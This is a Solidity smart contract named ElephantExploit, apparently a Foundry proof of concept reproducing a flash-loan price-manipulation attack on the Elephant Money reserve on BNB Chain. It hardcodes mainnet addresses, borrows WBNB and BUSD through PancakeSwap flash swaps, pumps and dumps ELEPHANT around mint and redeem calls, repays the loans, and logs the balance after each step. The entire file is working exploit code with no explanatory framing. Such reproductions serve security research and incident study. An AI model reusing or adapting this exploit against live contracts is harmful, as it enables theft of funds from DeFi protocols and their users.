// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.13;

import {IPancakePair} from "./interfaces/IPancakePair.sol";

import {IERC20} from "./interfaces/IERC20.sol";

import {IPancakeRouter} from "./interfaces/IPancakeRouter.sol";

import {IWBNB} from "./interfaces/IWBNB.sol";

import "forge-std/console2.sol";

interface IElephantReserve {
    function mint(uint256) external;
    function redeem(uint256) external;
}


contract ElephantExploit {
    IWBNB public wbnb = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));

    IERC20 public trunk = IERC20(0xdd325C38b12903B727D16961e61333f4871A70E0);

    IERC20 public elephant = IERC20(0xE283D0e3B8c102BAdF5E8166B73E02D96d92F688);

    IERC20 public busd = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);

    address public BUSD_USDT_Pair = 0x7EFaEf62fDdCCa950418312c6C91Aef321375A00;

    address public elephant_wbnb_Pair =
        0x1CEa83EC5E48D9157fCAe27a19807BeF79195Ce1;

    address public BUSDT_WBNB_Pair = 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE;

    address[] path_1 = [address(wbnb), address(elephant)];

    address[] path_2 = [address(elephant), address(wbnb)];

    address[] path_3 = [address(trunk), address(busd)];

    address[] path_4 = [address(wbnb), address(busd)];

    IPancakeRouter router =
        IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));

    IElephantReserve elephant_reserve =
        IElephantReserve(0xD520a3B47E42a1063617A9b6273B206a07bDf834);

    constructor() {
        elephant.approve(address(router), type(uint256).max);

        trunk.approve(address(router), type(uint256).max);

        trunk.approve(address(elephant_reserve), type(uint256).max);

        busd.approve(address(elephant_reserve), type(uint256).max);

        wbnb.approve(address(router), type(uint256).max);
    }

    function initialCall() public {
        IPancakePair(BUSDT_WBNB_Pair).swap(
            0,
            100000 ether,
            address(this),
            "0x00"
        );
    }

    function pancakeCall(
        address sender,
        uint256 amount0,
        uint256 amount1,
        bytes calldata data
    ) external {
        sender;
        data;
        amount0;
        amount1;

        if (msg.sender == BUSDT_WBNB_Pair) {
            IPancakePair(BUSD_USDT_Pair).swap(
                0,
                90000000 ether,
                address(this),
                "0x00"
            );
        } else {
            attack();
        }
    }

    function attack() public {

        wbnb.withdraw(100000 ether);

        router.swapExactETHForTokensSupportingFeeOnTransferTokens{
            value: 100000 ether
        }(0, path_1, address(this), block.timestamp);

        uint256 balance_elephant = elephant.balanceOf(address(this));
 
        console2.log(
            unicode"-üêò Elephant balance after swapping",
            balance_elephant / 1e9
        );
 
        elephant_reserve.mint(90000000 ether);

        uint256 balance_trunk = trunk.balanceOf(address(this));

         console2.log(
            unicode"-üåé Trunk balance after minting",
            balance_trunk / 1e18
        );
        console2.log(
            unicode"-üí∏ BUSD balance after minting",
            busd.balanceOf(address(this)) / 1e18
        );
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            balance_elephant,
            0,
            path_2,
            address(this),
            block.timestamp
        );

         console2.log(
            unicode"-üí∞ WBNB balance after swapping",
            wbnb.balanceOf(address(this)) / 1e18
        );

        balance_trunk = trunk.balanceOf(address(this));

        elephant_reserve.redeem(balance_trunk);

         console2.log(
            unicode"-üí∏ BUSD balance after redeeming",
            busd.balanceOf(address(this)) / 1e18
        );

        uint256 b3 = elephant.balanceOf(address(this));

        console2.log(unicode"-üêò Elephant balance after redeeming", b3 / 1e9);

        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            b3,
            0,
            path_2,
            address(this),
            block.timestamp
        );

       console2.log(
            unicode"-üí∞ WBNB balance before paying back",
            wbnb.balanceOf(address(this)) / 1e18
        ); 

        wbnb.transfer(BUSDT_WBNB_Pair, 100300 ether);

        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            wbnb.balanceOf(address(this)),
            0,
            path_4,
            address(this),
            block.timestamp
        );

         console2.log(
            unicode"-üí∏ BUSD balance before paying back ",
            busd.balanceOf(address(this)) / 1e18
        ); 

        busd.transfer(BUSD_USDT_Pair, 90300000 ether);
    }

    receive() external payable {}
}
